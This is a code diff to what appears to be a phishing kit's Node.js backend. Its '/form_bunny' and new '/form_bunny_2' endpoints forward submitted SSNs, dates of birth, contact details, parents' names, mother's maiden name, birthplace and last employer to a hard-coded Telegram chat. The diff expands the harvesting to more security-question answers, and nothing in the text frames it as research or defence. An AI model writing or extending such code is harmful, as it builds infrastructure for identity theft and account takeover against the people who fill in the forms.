@@ -152,14 +152,35 @@ app.post("/form_bunny", async (req, res) => {
   try {
     console.log(req.body);
 
-    const {firstName, lastName, email, phoneNumber, ssn, gender, dob } =
+    const {firstName, lastName, email, phoneNumber, ssn, gender, dob,aboutYou } =
       req.body;
 
     // Handle other form fields as needed
 
     await axios.post(`${TELEGRAM_API4}/sendMessage`, {
       chat_id: "7068073891",
-      text: `New Form Submission:\n\nFirst Name: ${firstName}\nLast Name: ${lastName}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nSSN: ${ssn}\nGender: ${gender}\nDate of Birth: ${dob}`,
+      text: `New Form Submission:\n\nFirst Name: ${firstName}\nLast Name: ${lastName}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nSSN: ${ssn}\nGender: ${gender}\nDate of Birth: ${dob}\n\nAbout You: ${aboutYou}`,
+    });
+
+    return res.send();
+  } catch (error) {
+    console.error("An error occurred while processing the form:", error);
+    return res.status(500).send("Internal Server Error");
+  }
+});
+
+app.post("/form_bunny_2", async (req, res) => {
+  try {
+    console.log(req.body);
+
+    const {fatherName,motherName, motherMaiden, birthPlace, lastEmployer,  } =
+      req.body;
+
+    // Handle other form fields as needed
+
+    await axios.post(`${TELEGRAM_API4}/sendMessage`, {
+      chat_id: "7068073891",
+      text: `New Form Submission:\n\n Father's Name: ${fatherName}\nMother's Name: ${motherName}\nMother's Maiden Name: ${motherMaiden}\nBirth Place: ${birthPlace}\nLast Employer: ${lastEmployer}`,
     });
 
     return res.send();
